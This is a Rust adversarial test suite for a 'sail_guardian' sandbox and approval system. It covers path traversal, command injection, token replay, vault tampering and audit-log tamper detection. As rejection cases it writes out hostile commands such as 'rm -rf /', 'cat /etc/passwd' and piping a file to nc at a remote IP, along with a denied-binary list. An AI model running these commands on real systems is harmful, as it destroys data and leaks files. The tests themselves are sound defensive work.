use std::fs;
use std::path::PathBuf;
use std::sync::Arc;
use uuid::Uuid;

use sail_common::types::SubsystemId;
use sail_guardian::{
    ApprovalBroker, AuditIntegrityError, AuditLedger, Capability, CredentialError, CredentialStore,
    DecisionOutcome, ExecutionDenied, FsCapability, GuardianExecutionBroker, PolicyEngine,
    SandboxPolicy, SandboxViolation, SystemCapability, ToolCapability, clear_global_broker,
    global_broker,
};

/// Fixture helper: sets up isolated temporary directories for persistent vault & audit
struct TestHarness {
    tmp_path: PathBuf,
    vault_dir: PathBuf,
    audit_file: PathBuf,
}

impl TestHarness {
    fn new() -> Self {
        let unique_id = Uuid::new_v4();
        let tmp_path = std::env::temp_dir().join(format!("sail-test-{}", unique_id));
        let vault_dir = tmp_path.join("vault");
        let audit_file = tmp_path.join("audit.log");
        let _ = fs::create_dir_all(&vault_dir);
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&vault_dir, fs::Permissions::from_mode(0o700)).unwrap();
        Self {
            tmp_path,
            vault_dir,
            audit_file,
        }
    }
}

impl Drop for TestHarness {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.tmp_path);
    }
}

// ------------------------------------------------------------------------------------------------
// [Issue #30]: Enforceable Sandbox — Traversal, Sibling Prefixes, Symlinks, Injection, Metachars
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_sandbox_path_traversal_and_sibling_prefix() {
    let harness = TestHarness::new();
    let root = harness.tmp_path.join("workspace");
    fs::create_dir_all(&root).unwrap();

    let sibling_evil = harness.tmp_path.join("workspace-evil");
    fs::create_dir_all(&sibling_evil).unwrap();
    fs::write(sibling_evil.join("secret.txt"), "stolen data").unwrap();

    let mut sandbox = SandboxPolicy::new();
    sandbox = sandbox.with_root(&root);

    // 1. Sibling prefix attack: "/workspace-evil/secret.txt" sharing prefix with "/workspace"
    let sibling_file = sibling_evil.join("secret.txt");
    let res = sandbox.validate_path(&sibling_file, false);
    assert!(
        matches!(res, Err(SandboxViolation::PathEscapesRoot { .. })),
        "Sibling prefix must be denied, got: {:?}",
        res
    );

    // 2. Double dot traversal escapes: "/workspace/subdir/../../workspace-evil/secret.txt"
    let subdir = root.join("subdir");
    fs::create_dir_all(&subdir).unwrap();
    let traversal = subdir
        .join("../..")
        .join("workspace-evil")
        .join("secret.txt");
    let res = sandbox.validate_path(&traversal, false);
    assert!(
        matches!(res, Err(SandboxViolation::PathEscapesRoot { .. })),
        "Dot-dot traversal escape must be denied"
    );

    // 3. Symlink target escape attack: symlink inside workspace pointing to /etc/shadow or /tmp
    let symlink_path = root.join("escape_link");
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        let _ = symlink("/etc/shadow", &symlink_path);
        if symlink_path.exists() {
            let res = sandbox.validate_path(&symlink_path, false);
            assert!(
                res.is_err(),
                "Symlink escaping to sensitive host target must be denied"
            );
        }
    }

    // 4. Special device files blocking
    #[cfg(unix)]
    {
        for dev in ["/dev/zero", "/dev/urandom", "/dev/null"] {
            let dev_path = PathBuf::from(dev);
            if dev_path.exists() {
                let res = sandbox.validate_path(&dev_path, false);
                assert!(
                    matches!(res, Err(SandboxViolation::SensitivePathBlocked { .. })),
                    "System device path must be blocked immediately"
                );
            }
        }
    }
}

#[test]
fn test_adversarial_sandbox_command_injection_and_interpreter_bypass() {
    let sandbox = SandboxPolicy::new();

    // 1. Shell metacharacters injection attempts
    let attacks = [
        "ls; rm -rf /",
        "ls && cat /etc/passwd",
        "echo `whoami`",
        "cat file | nc 1.2.3.4 9000",
        "git status > /dev/null",
        "ls $HOME",
        "git status\nrm -rf /",
    ];

    for attack in attacks {
        let res = sandbox.validate_command(attack);
        assert!(
            matches!(res, Err(SandboxViolation::CommandNotAllowed { .. })),
            "Metacharacter attack '{attack}' must be rejected, got: {:?}",
            res
        );
    }

    // 2. Unapproved binaries
    for bin in ["reboot", "nmap", "nc", "curl", "python", "perl", "ruby"] {
        let res = sandbox.validate_command(bin);
        assert!(
            res.is_err(),
            "Unauthorized binary '{bin}' must be rejected from allowlist"
        );
    }

    // 3. Interpreter inline scripts bypass (-c, -e)
    for script_attack in [
        "bash -c 'id'",
        "sh -c 'uname -a'",
        "python3 -c 'import os; os.system(\"id\")'",
    ] {
        let res = sandbox.validate_command(script_attack);
        assert!(
            res.is_err(),
            "Inline interpreter execution must be strictly denied"
        );
    }

    // 4. Even ordinary commands require the dedicated isolated runner
    assert!(sandbox.validate_command("git status").is_err());
    assert!(sandbox.validate_command("ls -la").is_err());
    assert!(sandbox.validate_command("cargo check").is_err());
}

// ------------------------------------------------------------------------------------------------
// [Issue #31]: Approvals, Single-Use Capability Tokens, Replay Protection & Revocation
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_capability_token_replay_and_tampering() {
    let broker = ApprovalBroker::new();

    let cap = Capability::Filesystem(FsCapability::Write {
        path: PathBuf::from("/home/main/SAIL/config.toml"),
    });

    let session =
        broker.create_session(SubsystemId::Bridge, cap.clone(), "Update repository config");

    // 1. Resolve session with approval
    let token = broker
        .resolve_session(session.session_id, true)
        .expect("Approval should issue token");
    assert_eq!(token.bound_actor, SubsystemId::Bridge);
    assert_eq!(token.bound_capability, cap);

    // 2. Consume token on first valid execution
    let consumed = broker.consume_token(token.token_id, SubsystemId::Bridge, &cap);
    assert!(consumed.is_ok(), "First consumption must succeed");

    // 3. Replay attack: consuming the exact same token a second time must FAIL
    let replayed = broker.consume_token(token.token_id, SubsystemId::Bridge, &cap);
    assert!(
        matches!(replayed, Err(sail_guardian::TokenConsumptionError::TokenReplayed(tid)) if tid == token.token_id),
        "Replayed token consumption must be rejected"
    );

    // 4. Actor impersonation attack: different subsystem attempts to consume the token
    let session2 = broker.create_session(
        SubsystemId::Bridge,
        cap.clone(),
        "Legitimate Bridge session",
    );
    let token2 = broker.resolve_session(session2.session_id, true).unwrap();
    let impersonation = broker.consume_token(token2.token_id, SubsystemId::Agents, &cap);
    assert!(
        matches!(
            impersonation,
            Err(sail_guardian::TokenConsumptionError::ActorMismatch { .. })
        ),
        "Subsystem impersonation attempt must be rejected"
    );

    // 5. Parameter tampering / reparameterization attack: token was approved for config.toml, but attacker targets /etc/shadow
    let session3 =
        broker.create_session(SubsystemId::Bridge, cap.clone(), "Legitimate config write");
    let token3 = broker.resolve_session(session3.session_id, true).unwrap();
    let tampered_cap = Capability::Filesystem(FsCapability::Write {
        path: PathBuf::from("/etc/shadow"),
    });
    let tampering = broker.consume_token(token3.token_id, SubsystemId::Bridge, &tampered_cap);
    assert!(
        matches!(
            tampering,
            Err(sail_guardian::TokenConsumptionError::CapabilityMismatch)
        ),
        "Reparameterization with altered target resource must be rejected"
    );
}

#[test]
fn test_adversarial_revocation_takes_immediate_effect() {
    let broker = ApprovalBroker::new();

    let cap = Capability::Tool(ToolCapability::CliCommand("git pull".into()));
    let session = broker.create_session(SubsystemId::Dialogue, cap.clone(), "Sync repository");
    let token = broker.resolve_session(session.session_id, true).unwrap();

    // Revoke grant immediately
    broker.revoke_grant(token.token_id);
    assert!(broker.is_revoked(token.token_id));

    // Attempting to consume revoked token fails closed
    let res = broker.consume_token(token.token_id, SubsystemId::Dialogue, &cap);
    assert!(
        matches!(res, Err(sail_guardian::TokenConsumptionError::Revoked(tid)) if tid == token.token_id),
        "Revoked token must be rejected"
    );
}

// ------------------------------------------------------------------------------------------------
// [Issue #29]: Execution Boundary Broker & Fail-Closed Gatekeeping
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_execution_broker_fails_closed_when_guardian_unavailable() {
    // 1. Explicitly clear global broker to simulate Guardian service failure or bypass
    clear_global_broker();

    // Any attempt to retrieve global broker fails closed
    let broker_res = global_broker();
    assert!(
        matches!(broker_res, Err(ExecutionDenied::GuardianUnavailable)),
        "Uninitialized Guardian must fail closed"
    );
}

#[test]
fn test_adversarial_denied_execution_produces_zero_side_effects() {
    let harness = TestHarness::new();
    let root = harness.tmp_path.join("sandbox");
    fs::create_dir_all(&root).unwrap();

    let target_file = harness.tmp_path.join("must_never_exist.txt");

    let policy = Arc::new(PolicyEngine::new());
    let audit = Arc::new(AuditLedger::new());
    let approval = Arc::new(ApprovalBroker::new());
    let mut sandbox = SandboxPolicy::new();
    sandbox = sandbox.with_root(&root);
    let sandbox = Arc::new(sandbox);

    let broker = GuardianExecutionBroker::new(policy, audit.clone(), approval, sandbox);

    // Attempt execution outside sandbox
    let outside_cap = Capability::Filesystem(FsCapability::Write {
        path: target_file.clone(),
    });

    let mut side_effect_executed = false;
    let res = broker.authorize_and_execute(SubsystemId::Dialogue, outside_cap, None, None, || {
        side_effect_executed = true;
        fs::write(&target_file, "corrupt").unwrap();
    });

    assert!(res.is_err(), "Execution outside sandbox must be denied");
    assert!(
        !side_effect_executed,
        "Side-effect function must never run on deny"
    );
    assert!(
        !target_file.exists(),
        "No filesystem side effects must be produced"
    );

    // Denial must be logged in audit trail
    assert_eq!(audit.len(), 1);
    let receipts = audit.list(1);
    assert_eq!(receipts[0].outcome, DecisionOutcome::Denied);
}

// ------------------------------------------------------------------------------------------------
// [Issue #32]: Encrypted Credential Vault & Leakage Redaction
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_encrypted_vault_survives_restart_and_rejects_tampering() {
    let harness = TestHarness::new();
    let secret_val = "sk_live_super_secret_token_12345";

    // 1. Open persistent encrypted vault and store credential
    {
        let vault =
            CredentialStore::open_persistent(&harness.vault_dir).expect("Open vault failed");
        let handle = vault
            .store_credential(
                SubsystemId::Bridge,
                "stripe_api",
                secret_val,
                "read:charges",
                chrono::Duration::hours(2),
            )
            .expect("Store failed");

        assert_eq!(handle.owner, SubsystemId::Bridge);
        assert_eq!(handle.scope, "read:charges");
    }

    // 2. Restart simulation: reopen persistent vault from disk
    {
        let restarted =
            CredentialStore::open_persistent(&harness.vault_dir).expect("Reopen vault failed");
        let handle = restarted
            .get_handle(SubsystemId::Bridge, "stripe_api", "read:charges")
            .expect("Handle resolution failed");

        // Verify secret execution works via handle
        let verified =
            restarted.execute_with_secret(&handle, SubsystemId::Bridge, |s| s == secret_val);
        assert_eq!(verified, Ok(true));

        // Other subsystems cannot resolve or execute
        let unauthorized = restarted.get_handle(SubsystemId::Agents, "stripe_api", "read:charges");
        assert!(matches!(
            unauthorized,
            Err(CredentialError::UntrustedConnector)
        ));
    }

    // 3. Redaction verification: raw secret is stripped from logs
    {
        let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();
        let log_line = format!(
            "Error while communicating: authorization failed for token {secret_val} on host"
        );
        let sanitized = vault.redact_text(&log_line);
        assert!(
            !sanitized.contains(secret_val),
            "Raw secret must be redacted from log strings"
        );
        assert!(sanitized.contains("[REDACTED_SECRET]"));
    }

    // 4. Vault ciphertext tampering test
    {
        let enc_path = harness.vault_dir.join("vault.enc");
        let mut bytes = fs::read(&enc_path).unwrap();
        // Flip one byte in the ciphertext payload
        let last = bytes.len() - 1;
        bytes[last] ^= 0xFF;
        fs::write(&enc_path, bytes).unwrap();

        let tampered_open = CredentialStore::open_persistent(&harness.vault_dir);
        assert!(
            tampered_open.is_err(),
            "Tampered vault ciphertext must fail decryption and fail closed"
        );
    }
}

// ------------------------------------------------------------------------------------------------
// [Issue #33]: Durable Tamper-Evident Audit Ledger & Truncation/Corruption Detection
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_durable_audit_tampering_and_truncation_detection() {
    let harness = TestHarness::new();

    // 1. Create durable audit ledger and write records
    {
        let ledger =
            AuditLedger::open_persistent(&harness.audit_file).expect("Failed to open audit log");
        ledger.record(
            SubsystemId::Dialogue,
            Capability::System(SystemCapability::OsTelemetry),
            DecisionOutcome::Granted,
            "Telemetry check",
        );
        ledger.record(
            SubsystemId::Bridge,
            Capability::Tool(ToolCapability::KernelTool("fs:query".into())),
            DecisionOutcome::Granted,
            "Workspace file query",
        );
        ledger.record(
            SubsystemId::Agents,
            Capability::Filesystem(FsCapability::Read {
                path: PathBuf::from("/etc/shadow"),
            }),
            DecisionOutcome::Denied,
            "Sandbox denied /etc read",
        );
        assert_eq!(ledger.len(), 3);
        assert!(ledger.verify_chain());
    }

    // 2. Normal restart boot-time verification
    {
        let reloaded =
            AuditLedger::open_persistent(&harness.audit_file).expect("Verification failed on boot");
        assert_eq!(reloaded.len(), 3);
        assert!(reloaded.verify_chain());
    }

    // 3. Attacker modifies one byte in the second audit entry
    let log_content = fs::read_to_string(&harness.audit_file).unwrap();
    let lines: Vec<&str> = log_content.trim().lines().collect();
    assert_eq!(lines.len(), 3);

    // Tamper with sequence 2
    let tampered_line2 = lines[1].replace("Workspace file query", "Tampered attacker message");
    let tampered_log = format!("{}\n{}\n{}\n", lines[0], tampered_line2, lines[2]);
    fs::write(&harness.audit_file, tampered_log).unwrap();

    // Boot-time verification MUST catch the tampered entry
    let boot_result = AuditLedger::open_persistent(&harness.audit_file);
    assert!(
        matches!(
            boot_result,
            Err(AuditIntegrityError::TamperedEntry { sequence: 2, .. })
        ),
        "Boot verification must detect tampered record content"
    );

    // 4. Attacker deletes/truncates sequence 2 (sequence broken 1 -> 3)
    let truncated_log = format!("{}\n{}\n", lines[0], lines[2]);
    fs::write(&harness.audit_file, truncated_log).unwrap();

    let boot_result_trunc = AuditLedger::open_persistent(&harness.audit_file);
    assert!(
        matches!(
            boot_result_trunc,
            Err(AuditIntegrityError::SequenceBroken { .. })
        ),
        "Boot verification must detect deleted or skipped sequence entries"
    );
}
